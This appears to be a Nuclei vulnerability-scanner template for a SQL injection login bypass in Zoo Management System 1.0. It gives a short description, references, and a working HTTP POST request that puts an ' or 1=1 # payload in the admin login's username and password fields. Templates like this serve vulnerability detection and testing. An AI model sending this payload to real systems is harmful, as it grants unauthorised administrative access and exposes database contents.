# Nuclei Template: Zoo Management System 1.0 - SQL Injection
**Template ID:** zms-auth-bypass
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`zms-auth-bypass.yaml`)

## Vulnerability Information & PoC

## Description
Zoo Management System 1.0 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
POST /zms/admin/index.php HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}/zms/admin/index.php
Cookie: PHPSESSID={{randstr}}

username=dw1%27+or+1%3D1+%23&password=dw1%27+or+1%3D1+%23&login=
```

## References
- https://www.exploit-db.com/exploits/48880
- https://packetstormsecurity.com/files/159567/Zoo-Management-System-1.0-SQL-Injection.html
